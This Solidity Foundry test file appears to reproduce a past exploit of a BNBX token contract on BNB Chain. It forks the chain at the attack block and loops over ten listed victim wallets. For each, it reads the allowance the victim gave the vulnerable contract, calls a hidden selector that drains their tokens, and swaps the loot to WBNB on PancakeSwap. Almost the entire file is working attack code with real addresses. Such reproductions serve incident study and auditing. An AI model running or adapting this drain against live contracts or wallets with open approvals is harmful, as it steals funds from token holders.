// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~5 $ETH
// Attacker : https://bscscan.com/address/0x123fa25c574bb3158ecf6515595932a92a1da510
// Attack Contract : https://bscscan.com/address/0xe6e06030b33593d140f224fc1cdd1b8ffe99e50a
// Vulnerable Contract : https://bscscan.com/address/0x389a9ae29fbe53cca7bc8b7a4d9d0a04078e1c24
// Attack Tx : https://bscscan.com/tx/0xea88dc6dbd81d09c572b5849e0d4508598edcf8f11c9a995cd8fe7e6c194f39e

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IERC20 BNBX = IERC20(0xF662457774bb0729028EA681BB2C001790999999);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair WBNB_BNBX_LpPool = IPancakePair(0xAa3f145f854e12F1566548c01e74c1b9d98c634d);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address BNBX_0x389a = 0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24;

    function setUp() public {
        vm.createSelectFork("bsc", 38_230_509 - 1);
        vm.label(address(BNBX), "BNBX");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(BNBX_0x389a), "BNBX_0x389a");
    }

    function testExploit() public {
        emit log_named_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)));
        // 10 victims as an example
        address[] memory victims = new address[](10);
        victims[0] = 0xE71F1d71aFe531bCd9b89f82D8a44B04F73b7146;
        victims[1] = 0xe497e225407b5a305F5e359973bebD4A1986CF7e;
        victims[2] = 0xD1616BfB6A2009Ee33Db9FCC3C646332E001797c;
        victims[3] = 0xcc079F627311657c8A4B3D8EDA8742352B9dD4aC;
        victims[4] = 0xB91aF0cE8bbd4b597eDa7B5194231Aa1B487b85C;
        victims[5] = 0xb53905E26CA1F0106107772C1f48e6D035B4E0F1;
        victims[6] = 0xAfA24DEE0c2AA82295E1d0e885eb44A81306442D;
        victims[7] = 0x98C9440822B4A8F9A24E7ee34222E566F08c15E4;
        victims[8] = 0x830a727B59477373Cf7bbB66fB4abf22afBBdF56;
        victims[9] = 0x741b7870DBDCd8CceD6ae19bABA4Da814101484d;

        for (uint256 i; i < victims.length; i++) {
            uint256 allowance = BNBX.allowance(victims[i], address(BNBX_0x389a));
            uint256 balance = BNBX.balanceOf(victims[i]);
            uint256 available = balance <= allowance ? balance : allowance; // available USDT

            if (available > 0) {
               BNBX_0x389a.call(abi.encodeWithSelector(bytes4(0x11834d4c), victims[i]));
            }
        }
        TOKENToWBNB();
        emit log_named_decimal_uint("Attacker WBNB balance after attack", WBNB.balanceOf(address(this)), 18);
    }

    function TOKENToWBNB() internal {
        (uint256 reserveWBNB, uint256 reserveTOKEN,) = WBNB_BNBX_LpPool.getReserves();
        uint256 amountOut;
        BNBX.transfer(address(WBNB_BNBX_LpPool), BNBX.balanceOf(address(this)));

        (uint256 reserveWBNB_after, uint256 reserveTOKEN_after,) = WBNB_BNBX_LpPool.getReserves();

        amountOut = PancakeRouter.getAmountOut(
            reserveTOKEN_after - reserveTOKEN,
            reserveTOKEN,
            reserveWBNB
        );
        WBNB_BNBX_LpPool.swap(amountOut, 0 , address(this), "");
    }

    fallback() external payable {}
    receive() external payable {}
}